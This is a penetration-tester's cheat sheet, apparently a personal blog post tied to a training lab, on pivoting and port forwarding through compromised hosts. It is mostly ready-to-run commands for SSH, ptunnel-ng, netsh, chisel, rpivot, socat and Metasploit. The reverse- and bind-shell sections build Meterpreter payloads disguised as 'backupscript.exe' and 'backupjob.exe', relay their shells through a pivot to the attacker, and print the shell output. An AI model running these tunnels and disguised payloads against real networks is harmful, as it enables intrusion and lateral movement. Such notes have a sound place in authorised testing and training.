---
title: Pivoting And Port Forwarding
date: 2025-11-22 19:45:35
categories:
  - Active Directory
  - Linux
  - Pivoting And Port Forwarding
tags:
  - Local-Port-Forwarding
  - Dynamic-Port-Forwarding
  - Proxychains
  - Rpivot
  - sshuttle
  - plink
  - Proxifier
  - socat
  - Reverse-Port-Forwarding
  - Chisel

cover: /img/pivoting.png
top_img: /img/bg-img.jpg
description: 
---

n = Our Attacker Machine

n+1 = Pivot Machine

n+2 = Internal Machine


# Local Port Forwarding

## SSH (n)

Forward a Single Port

```bash
ssh -L local_port:localhost:remote_port username@n+1
```

Forward Multiple Ports (n)

```bash
ssh -L local_port:localhost:remote_port -L local_port:localhost:remote_port username@n+1
```


# Port Forwarding

## Linux

### meterpreter (n)

➜ Requires an active Meterpreter session

```bash
meterpreter > portfwd add -l Local-proxy-port -p remote-port -r n+2
```

Example

```bash
xfreerdp /v:localhost:Local-proxy-port /u:username /p:password
```

### ptunnel-ng 

##### Server Side ( n+1 )

```bash
sudo ./ptunnel-ng -r <target-ip (n+1 or n+2)> -R <target-port>
```

##### Client Side ( n )

```bash
sudo ./ptunnel-ng -p <pivot-ip (n+1)> -l <local-proxy-port> -r <target-ip> -R <target-port>
```


➜ If we forward SSH, we can then use it for dynamic port forwarding.


##### Example : Port forward SSH

###### Server Side ( n+1 )

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

###### Client Side ( n )

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

###### Connect to the target port 

```bash
ssh -p2222 -lubuntu 127.0.0.1
```

Dynamic Port Forwarding over SSH

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

##### Example : Port forward RDP

###### Client Side ( n )

```bash
sudo ./src/ptunnel-ng -p10.129.202.64 -l 2222 -r172.16.5.19 -R3389
```
###### Server Side ( n+1 )

```bash
sudo ./ptunnel-ng -r172.16.5.19 -R3389
```
###### Connect RDP

```bash
xfreerdp /v:localhost:2222 /u:victor /p:'pass@123'
```

 

## Windows

### Netsh (n+1)

```cmd
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=Listener-port-on-n+1 listenaddress=n+1 connectport=remote-port-on-n+2 connectaddress=n+2
```

Example

```cmd
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19


C:\Windows\system32>netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.19     3389
```

```bash
xfreerdp /v:10.129.42.198:8080 /u:victor /p:'pass@123'
```




# Dynamic Port Forwarding

## Linux

### Using Proxychains

#### SSH (n)

```bash
ssh -D Local-proxy-port username@n+1
```

#### Meterpreter (n)

**➜ Requires an active Meterpreter session**

##### Start the SOCKS Proxy

```bash
msf6 > use auxiliary/server/socks_proxy 

msf6 auxiliary(server/socks_proxy) > set SRVPORT Local-proxy-port 
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0 
msf6 auxiliary(server/socks_proxy) > set version 4a 
msf6 auxiliary(server/socks_proxy) > run
```

##### Add Route to internal_network


```bash
msf6 > use post/multi/manage/autoroute 

msf6 post(multi/manage/autoroute) > set SESSION <id> 
msf6 post(multi/manage/autoroute) > set SUBNET internal_network_@ 
msf6 post(multi/manage/autoroute) > run
```

	or 

```bash
meterpreter > run autoroute -s internal_network_@/mask
```

#### Rpivot 

##### Server (attacker machine - n)

```bash
python2.7 server.py --proxy-port Local-proxy-port --server-port Listener-port --server-ip 0.0.0.0
```

##### Client (pivot machine - n+1)  

Transfer rpivot to n+1 machine:

```bash
scp -r rpivot username@n+1:/home/username/
```

Run client:

```bash
python2.7 client.py --server-ip n --server-port Listener-port
```

Then 

```bash
proxychains firefox-esr 172.16.5.135:80
```
or 

```bash
proxychains curl http://172.16.5.135/
```


#### Chisel


Transfer chisel to n+1 machine:

```bash
scp -r chisel username@n+1:/home/username/
```

Server ( n+1 )

```bash
./chisel server -v -p listener-port --socks5
```


Client ( n )

```bash
./chisel client -v machine-n+1:listener-port socks
```

➜ We should use `socks5 127.0.0.1 1080` in /etc/proxychains.conf.


#### Chisel Reverse Pivot


Server ( n )

```bash
sudo ./chisel server --reverse -v -p listening-port --socks5
```

Transfer chisel to n+1 machine:

```bash
scp -r chisel username@n+1:/home/username/
```

Client ( n+1 )

```bash
./chisel client -v machine-n:listening-port R:socks
```

➜ We should use `socks5 127.0.0.1 1080` in /etc/proxychains.conf.


#### Configure Proxychains (n)

```bash
cat /etc/proxychains.conf  

socks4 127.0.0.1 Local-proxy-port
```


### Without Proxychains

#### sshuttle (n)

```bash
sudo sshuttle -r username@n+1 internal_network_@/mask -v
```

➜ Automatically handles traffic forwarding without needing Proxychains. 

➜ Works _only_ for SSH-based pivoting (no TOR/HTTPS proxy support).

Example

```bash
xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
```


## Windows

#### plink.exe (n)

##### SSH Dynamic SOCKS Proxy

```cmd
plink -ssh -D Local-proxy-port username@n+1
```

##### Proxy Handling (Windows)  

Use **Proxifier** to route selected tools through the proxy:

![Proxifier](/img/proxifier.png)

➜ After configuration, any selected tool will have its traffic forwarded automatically.



# Reverse Port Forwarding ( Reverse / Bind Shell )

## Reverse Shell

### Reverse Shell Preparation (Payload + Listener Setup)


Create Reverse Shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=<Internal-listener-Port-on-n+1>
```


 Configuring & Starting multi/handler


```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT <listener-Port-on-n> 
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
msf6 exploit(multi/handler) > run
```

### Creating the Reverse Port Forwarding Tunnel ( n+1 → n )


#### SSH

```bash
ssh -R Internal-IP-of-PivotHost-n+1:<Internal-listener-Port-on-n+1>:0.0.0.0:<listener-Port-on-n> username@n+1 -vN
```

#### meterpreter  
 
```bash
meterpreter > portfwd add -R -l <listener-Port-on-n> -p <Internal-listener-Port-on-n+1> -L IP-of-n-machine
```

#### Socat

```bash
socat TCP4-LISTEN:<Internal-listener-Port-on-n+1>,fork TCP4:IP-of-n-machine:<listener-Port-on-n>
```


### Execute Reverse Shell


Once you execute `backupscript.exe` on Windows (n+2), we receive a shell from Windows pivoted via the Ubuntu server :

```bash
meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```


## Bind Shell


### Bind Shell Preparation (Payload + Bind Setup)


Create Bind Shell

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=Listener-port-on-n+2
```


 Configuring & Starting multi/handler

```bash
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST n+1
msf6 exploit(multi/handler) > set LPORT Bind-port-on-n+1
msf6 exploit(multi/handler) > run
```

### Creating the Reverse Port Forwarding Tunnel ( n → n+1 )

###### Socat

```bash
socat TCP4-LISTEN:Bind-port-on-n+1,fork TCP4:n+2-machine:Listener-port-on-n+2
```


### Execute Bind Shell


```bash
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```